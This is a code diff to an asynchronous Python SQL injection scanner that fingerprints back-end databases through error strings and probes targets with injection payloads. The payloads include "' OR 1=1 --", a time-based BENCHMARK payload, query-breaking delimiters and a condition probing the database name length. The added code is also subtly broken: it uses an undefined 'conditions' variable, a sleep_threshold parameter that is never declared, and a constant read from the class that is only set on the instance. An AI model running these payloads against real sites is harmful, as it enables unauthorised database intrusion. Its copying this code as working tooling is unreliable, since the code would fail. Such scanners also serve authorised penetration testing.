@@ -8,6 +8,8 @@ class SQLInjectionScanner:
         self.database_types = database_types
         self.session = aiohttp.ClientSession()
         self.detected_db_type = None
+        self.DELIMITERS = ["'", '"', ';', ")", "')", '")', '*', '";']
+        self.DEFAULT_SLEEP_THRESHOLD = 5
         self.db_dict = {
             "MySQL": ['MySQL', 'MySQL Query fail:', 'SQL syntax', 'You have an error in your SQL syntax', 'mssql_query()', 'mssql_num_rows()', '1064 You have an error in your SQL syntax'],
             "PostGre": ['PostgreSQL query failed', 'Query failed', 'syntax error', 'unterminated quoted string', 'unterminated dollar-quoted string', 'column not found', 'relation not found', 'function not found'],
@@ -16,8 +18,40 @@ class SQLInjectionScanner:
             "Advantage_Database": ['AdsCommandException', 'AdsConnectionException', 'AdsException', 'AdsExtendedReader', 'AdsDataReader', 'AdsError'],
             "Firebird": ['Dynamic SQL Error', 'SQL error code', 'arithmetic exception', 'numeric value is out of range', 'malformed string', 'Invalid token']
         }
+        self.conditions = {
+            "SimpleTrue": "1=1",
+            "SimpleFalse": "1=2",
+            "ComplexCondition": "1=1 AND LENGTH(database()) > 5"
+        }
         self.db_name = None
         self.current_user = None
+        self.sleep_threshold = sleep_threshold
+
+    async def scan_database_type(self):
+        for database_type in self.database_types:
+            tasks = [self.scan_with_delimiter(database_type, delimiter) for delimiter in self.DELIMITERS]
+            results = await asyncio.gather(*tasks)
+
+            if any(results):
+                break
+
+    async def scan_with_delimiter(self, database_type, delimiter):
+        url = f"{self.target_url}/{database_type}{delimiter}"
+
+        try:
+            async with self.session.get(url) as response:
+                data = await response.text()
+                db_type = await self.detect_database_type(data)
+
+                if db_type:
+                    print(f"Database type: {db_type}")
+                    self.detected_db_type = db_type
+                    return True
+
+        except Exception as e:
+            logging.error(f'Error during scanning with delimiter {delimiter}: {e}')
+
+        return False
 
     async def detect_database_type(self, response_data):
         for db, identifiers in self.db_dict.items():
@@ -25,14 +59,6 @@ class SQLInjectionScanner:
                 if dbid in response_data:
                     return db
         return None
-
-    async def boolean_based_detection(self, database_type):
-        payload = f"{database_type}' OR 1=1 --"
-        return await self.perform_injection_detection(payload)
-
-    async def time_based_detection(self, database_type):
-        payload = f"{database_type}' OR IF(1=1, BENCHMARK(5000000, SHA1('test')), 0) --"
-        return await self.perform_injection_detection(payload)
 
     async def perform_injection_detection(self, payload):
         url = f"{self.target_url}/{payload}"
@@ -49,7 +75,7 @@ class SQLInjectionScanner:
                     print(f"Found dynamic unique string: {dynamic_unique_string}")
                     return True
 
-                if elapsed_time > 5:
+                if elapsed_time > self.sleep_threshold:
                     return True
 
         except aiohttp.ClientError as e:
@@ -66,39 +92,26 @@ class SQLInjectionScanner:
             return match.group(1)
 
         return None
+
+    async def boolean_based_detection(self, database_type, conditions):
+        for condition_name, condition_value in conditions.items():
+            payload = f"{database_type}' OR {condition_value} --"
+            if await self.perform_injection_detection(payload):
+                print(f"Boolean-Based Injection Detected with condition '{condition_name}'")
+                return True
+
+        return False
+
+    async def time_based_detection(self, database_type):
+        payload = f"{database_type}' OR IF(1=1, BENCHMARK(5000000, SHA1('test')), 0) --"
+        return await self.perform_injection_detection(payload)
+
     async def scan_blind_sql_injection(self, database_type):
-        boolean_injection_detected = await self.boolean_based_detection(database_type)
+        boolean_injection_detected = await self.boolean_based_detection(database_type, conditions)
 
         time_injection_detected = await self.time_based_detection(database_type)
 
         return boolean_injection_detected or time_injection_detected
-
-    async def scan_database_type(self):
-        for database_type in self.database_types:
-            for suffix in ["'", '"', ';', ")", "')", '")', '*', '";']:
-                url = f"{self.target_url}/{database_type}{suffix}"
-
-                try:
-                    async with self.session.get(url) as response:
-                        data = await response.text()
-                        db_type = await self.detect_database_type(data)
-
-                        if db_type:
-                            print(f"Database type: {db_type}")
-                            self.detected_db_type = db_type
-                            break
-
-                except Exception as e:
-                    print('Error: ', e)
-                    print('Database type: Unknown')
-                    break
-
-            if self.detected_db_type:
-                injection_detected = await self.scan_blind_sql_injection(self.detected_db_type)
-                if injection_detected:
-                    print(f"Blind SQL Injection Detected for {self.detected_db_type}!")
-
-        return self.detected_db_type
 
     async def get_version(self):
         print(f"Getting version for {self.database_type} database...")
@@ -996,6 +1009,9 @@ async def main():
     parser.add_argument("-t", "--database_type", help="Database type")
     parser.add_argument("--get_version", action="store_true", help="Get database version")
     parser.add_argument("--get_current_user", action="store_true", help="Get current user")
+    parser.add_argument("--sleep-threshold", type=int, default=SQLInjectionScanner.DEFAULT_SLEEP_THRESHOLD,
+                        help="Threshold in seconds for sleep-based injection detection")
+
 
     args = parser.parse_args()
 
